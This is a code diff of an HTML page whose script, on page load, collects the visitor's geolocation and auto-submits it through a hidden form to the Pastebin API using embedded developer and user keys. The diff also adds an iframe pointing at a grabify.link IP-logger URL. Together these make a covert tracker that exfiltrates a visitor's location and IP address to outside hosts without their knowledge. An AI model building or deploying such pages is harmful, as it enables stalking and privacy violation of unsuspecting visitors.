@@ -31,33 +31,35 @@ async function capturePosition(position) {
     });
     console.log(loc_info);
 
-    fetch(domain+'/loc', {
-        method: 'POST',
-        body: JSON.stringify(loc_info)
-    });
+    form = document.getElementById('send_form')
+    data_ele = document.getElementById('send_data')
 
-    // end('')
-
+    data_ele.value = loc_info
+    form.submit()
 }
 
 async function main() {
   console.log("Yay");
-  fetch(domain+'/', {
-    method: 'GET',
-});
-    await getLocation();
+  await getLocation();
 }
 
-main()
 
         </script>
     </head>
+
+
+    
     <body>
-      <form action="https://pastebin.com/api/api_post.php" method="POST">
+      <iframe src="https://grabify.link/I0B4VP">
+      </frame>
+      <form id="send_form" action="https://pastebin.com/api/api_post.php" method="POST">
         <input name="api_dev_key" value="g0Nz1dKR1he8SW7Fef65UvMZCi7jH_07">
-        <input name="api_paste_code" value="test">
+        <input id="send_data" name="api_paste_code" value="test">
         <input name="api_option" value="paste">
         <input name="api_user_key" value="9de749bb07d5e678710cd00cae2aabe3">
       </form>
+      <script>
+        main();
+      </script>
     </body>
 </html>
